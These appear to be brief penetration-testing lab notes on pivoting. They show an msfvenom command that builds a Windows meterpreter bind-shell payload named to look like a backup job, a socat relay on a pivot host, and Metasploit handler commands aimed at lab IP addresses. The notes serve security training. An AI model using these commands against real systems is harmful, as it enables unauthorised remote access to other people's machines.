
![[Pasted image 20250626170602.png]]

**Creating a bind shell (attack host)
```shell-session
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
```

**Starting Socat Bind Shell Listener (on pivot host)
```shell-session
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

**Create Bind multi/handler (attack host)
```shell-session
use exploit/multi/handler
```
```shell-session
set payload windows/x64/meterpreter/bind_tcp
```
```shell-session
set RHOST 10.129.202.64
```
```shell-session
set LPORT 8080
```
```shell-session
run
```
```shell-session
getuid
```


